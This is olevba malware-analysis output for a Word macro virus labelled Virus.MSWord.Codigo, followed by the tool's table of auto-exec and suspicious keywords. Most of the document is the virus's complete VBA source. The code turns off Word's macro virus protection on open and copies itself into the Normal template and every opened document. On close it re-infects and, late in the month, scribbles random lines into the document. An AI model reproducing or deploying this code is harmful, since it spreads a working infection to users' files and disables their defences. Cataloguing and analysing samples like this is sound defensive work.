olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Codigo-12ceb3b2d4255243395acc73c2123d8e71fc0dab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Codigo-12ceb3b2d4255243395acc73c2123d8e71fc0dab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Esta Infectado
Private Sub Document_Close()
On Error Resume Next

Dim i, x1, x2, y1, y2 As Integer
Dim Figura


Call Document_Open

Randomize
If Day(Now()) > 23 Then

  For i = 1 To 100
    x1 = Int(1000 * Rnd(1000))
    x2 = Int(1000 * Rnd(1000))
    y1 = Int(1000 * Rnd(1000))
    y2 = Int(1000 * Rnd(1000))
    Figura = ActiveDocument.Shapes.AddLine(x1, y1, x2, y2)
  Next i
End If

ActiveDocument.Save
NormalTemplate.Save

End Sub

Private Sub Document_Open()
On Error Resume Next

Dim ad, nt As Object
Dim MiCodigo As String
Dim DocInfectado As Boolean
Dim NormalInfectado As Boolean

Options.VirusProtection = False

'Inicializar Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

MiCodigo = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
If Len(MiCodigo) < 1 Then
   MiCodigo = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
End If

Dim EsteCogigo As String
    EsteCodigo = Mid(MiCodigo, 1, Len(MiCodigo))

nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
nt.CodeModule.AddFromString EsteCodigo

ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
ad.CodeModule.AddFromString EsteCodigo

NormalTemplate.Save
ActiveDocument.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

